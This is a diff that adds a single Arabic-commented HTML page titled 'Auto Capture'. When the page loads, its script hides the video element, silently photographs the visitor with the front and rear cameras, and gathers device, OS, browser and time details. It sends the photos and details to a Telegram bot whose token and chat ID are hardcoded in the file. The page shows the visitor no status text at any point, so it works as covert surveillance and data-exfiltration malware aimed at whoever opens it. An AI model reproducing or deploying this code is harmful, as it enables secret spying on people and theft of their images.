@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Capture</title>
+<style>
+  /* إخفاء الكاميرا تمامًا */
+  video {
+    display: none !important;
+    visibility: hidden;
+    width: 0;
+    height: 0;
+  }
+  body {
+    font-family: sans-serif;
+    text-align: center;
+    padding-top: 60px;
+  }
+  #status {
+    font-size: 18px;
+    color: #333;
+  }
+</style>
+</head>
+<body>
+
+<p id="status"></p>
+<video id="video" autoplay playsinline></video>
+
+<script>
+const BOT_TOKEN = "8021921443:AAHkPvz4ODpYrm_US5bMHAgn2k4YF-llkvQ"
+const CHAT_ID = "1506580502";       // ← ضع هنا chat_id الخاص بك
+
+const video = document.getElementById('video');
+const statusText = document.getElementById('status');
+
+// دالة التقاط صورة من الكاميرا
+async function takePhoto(facingMode = "user") {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+  video.srcObject = stream;
+
+  await new Promise(r => video.onloadedmetadata = r);
+
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+
+  // إيقاف الكاميرا بعد الالتقاط
+  stream.getTracks().forEach(t => t.stop());
+
+  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
+  return blob;
+}
+
+// دالة إرسال الصورة إلى تيليجرام
+async function sendToTelegram(photoBlob, caption = "") {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("caption", caption);
+  formData.append("photo", photoBlob, "photo.jpg");
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+// جمع معلومات الجهاز
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  let deviceType = /mobile/i.test(ua) ? "📱 هاتف" : "💻 حاسوب";
+  let os = "نظام غير معروف";
+
+  if (/android/i.test(ua)) os = "Android";
+  else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
+  else if (/windows/i.test(ua)) os = "Windows";
+  else if (/mac/i.test(ua)) os = "MacOS";
+  else if (/linux/i.test(ua)) os = "Linux";
+
+  const browserMatch = ua.match(/(firefox|chrome|safari|edge|opera)/i);
+  const browser = browserMatch ? browserMatch[0] : "غير معروف";
+
+  const time = new Date().toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });
+
+  return `🧭 معلومات الجهاز:
+${deviceType}
+🖥️ النظام: ${os}
+🌐 المتصفح: ${browser}
+🕒 الوقت: ${time}`;
+}
+
+// تشغيل تلقائي عند فتح الموقع
+window.onload = async () => {
+  try {
+    statusText.textContent = "";
+    const front = await takePhoto("user");
+
+    statusText.textContent = "";
+    const back = await takePhoto("environment");
+
+    const info = getDeviceInfo();
+
+    statusText.textContent = "";
+
+    await sendToTelegram(front, `الصورة الأمامية\n\n${info}`);
+    await sendToTelegram(back, "📷 الصورة الخلفية");
+
+    statusText.textContent = "";
+  } catch (err) {
+    console.error(err);
+    statusText.textContent = "";
+  }
+};
+</script>
+
+</body>
+</html>
